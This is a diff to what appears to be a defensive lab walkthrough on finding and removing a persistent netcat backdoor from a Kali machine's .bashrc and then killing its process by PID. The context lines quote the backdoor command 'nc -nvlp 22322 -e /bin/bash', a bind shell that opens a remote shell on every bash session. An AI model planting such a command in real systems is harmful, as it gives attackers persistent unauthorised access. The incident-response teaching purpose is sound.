@@ -63,3 +63,10 @@ This means that the attacker is using this port to connect to the machine persis
 The '_nc -nvlp 22322 -e /bin/bash'_ command seems to be executed by the .bashrc file which is a script that gets executed each time a bash session is started. To confirm this, go to _.bashrc_ and read the file. Remove the backdoor by locating the _nc_ command and deleting it.
 
 Where is the .bashrc file located? `/home/kali/.bashrc`
+# Terminating the attacker's persistent connection
+
+Be cautious! Even after deleting the backdoor command from the _/home/kali/.bashrc_ file, the process will still run, so kill the process using the kill command. This command allows for process termination based on the process ID. The netstat command executed in the previous step showed the process _ID (PID)_ of the netcat backdoor. Use that ID to terminate the backdoor connection.
+`kill ID
+
+Check if the process has been killed by using sudo netstat -tulpn:
+`netstat -tulpn
